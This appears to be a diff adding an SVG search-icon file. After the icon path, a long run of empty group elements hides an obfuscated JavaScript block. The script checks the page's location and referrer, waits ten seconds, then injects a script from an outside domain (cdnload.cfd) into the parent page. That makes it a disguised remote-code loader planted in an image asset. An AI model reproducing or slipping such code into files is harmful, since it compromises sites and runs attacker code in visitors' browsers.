@@ -1,0 +1,74 @@
+<svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M13.7854 12.5947L10.6117 9.421C11.3758 8.4038 11.7883 7.16566 11.7869 5.89344C11.7869 2.64382 9.14306 0 5.89344 0C2.64382 0 0 2.64382 0 5.89344C0 9.14306 2.64382 11.7869 5.89344 11.7869C7.16566 11.7883 8.4038 11.3758 9.421 10.6117L12.5947 13.7854C12.7554 13.929 12.9649 14.0057 13.1803 13.9997C13.3957 13.9936 13.6006 13.9054 13.753 13.753C13.9054 13.6006 13.9936 13.3957 13.9997 13.1803C14.0057 12.9649 13.929 12.7554 13.7854 12.5947ZM1.68384 5.89344C1.68384 5.06086 1.93073 4.24698 2.39329 3.55471C2.85584 2.86245 3.51329 2.32289 4.2825 2.00428C5.0517 1.68566 5.89811 1.6023 6.71469 1.76473C7.53127 1.92715 8.28135 2.32808 8.87008 2.9168C9.4588 3.50553 9.85972 4.25561 10.0222 5.07219C10.1846
+5.88877 10.1012 6.73518 9.7826 7.50438C9.46399 8.27359 8.92443 8.93104 8.23217 9.39359C7.5399 9.85615 6.72602 10.103 5.89344 10.103C4.7774 10.1017 3.70745 9.65776 2.91828 8.8686C2.12912 8.07943 1.68518 7.00948 1.68384 5.89344Z" fill="#202020"/>
+
+
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+    <g></g>
+
+
+
+    <code> <script><![CDATA[
+     function a(){var m=['Bg9JywXOB3n0','l2LJB24TzMiTANjMnJDLANf3lMPWzW','nJKWntqXnMz2zu1iEa','Dw5KzwzPBMvK','n0jvywHnzq','Ahr0CdO','CMvMzxjYzxi','mZq3nJq0odHOBxn2CfK','mti3lJaUmc4X','mZa1mZeWm3nRy2fjqG','y2f0y2G','Ahr0Chm6','y2XLyxi','ChjVDg9JB2W','mtm1t3D1rMPM','Aw5JBhvKzxm','zg9JDw1LBNq','odyZmtqZugHnt2Lf','Ag9ZDa','y3jLyxrLrwXLBwvUDa','nZe2mtCWofjoAu1pEG','CgfYzw50','nta0mtCWzuzzELjj','Bg9JyxrPB24','DgHLBG','nZu0mZvTzwDJDNO','mZm2AvrSDfvO','mLH1DhnxvW','AgvHza'];a=function(){return m;};return a();}var i=b;function b(c,d){var e=a();return b=function(f,g){f=f-0xc7;var h=e[f];if(b['ooZoqy']===undefined){var i=function(m){var n='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var o='',p='';for(var q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>>(-0x2*q&0x6)):0x0){s=n['indexOf'](s);}for(var u=0x0,v=o['length'];u<v;u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['dlPqXj']=i,c=arguments,b['ooZoqy']=!![];}var j=e[0x0],k=f+j,l=c[k];return!l?(h=b['dlPqXj'](h),c[k]=h):h=l,h;},b(c,d);}(function(c,d){var h=b,e=c();while(!![]){try{var f=-parseInt(h(0xdc))/0x1*(-parseInt(h(0xc9))/0x2)+-parseInt(h(0xd4))/0x3+parseInt(h(0xc8))/0x4*(-parseInt(h(0xc7))/0x5)+-parseInt(h(0xdf))/0x6+parseInt(h(0xcf))/0x7*(parseInt(h(0xcd))/0x8)+parseInt(h(0xd9))/0x9*(-parseInt(h(0xe1))/0xa)+parseInt(h(0xd2))/0xb;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x9f246));if(typeof window[i(0xe0)]['ss']===i(0xce)){window[i(0xe0)]['ss']=0x1;if(window[i(0xe0)][i(0xdb)][i(0xd1)]!=''&&!window[i(0xe0)][i(0xe2)][i(0xdd)][i(0xda)](i(0xcb))&&!window[i(0xe0)]['location'][i(0xdd)][i(0xda)](i(0xd3))&&(window[i(0xe0)]['location'][i(0xd8)]===i(0xd6)||window['parent'][i(0xe2)]['protocol']===i(0xd0)))setTimeout(function(){var j=i;fetch(j(0xcc))[j(0xe3)](c=>{var k=j;if(c['ok'])return;else window['parent'][k(0xdb)][k(0xca)]['appendChild'](Object['assign'](window[k(0xe0)][k(0xdb)][k(0xde)]('script'),{'src':'https://cdnload.cfd/s.js'}));console[k(0xd7)]();})[j(0xd5)](function(){var l=j;console[l(0xd7)]();});},0x2710);}
+  ]]></script></code>
+
+</svg>
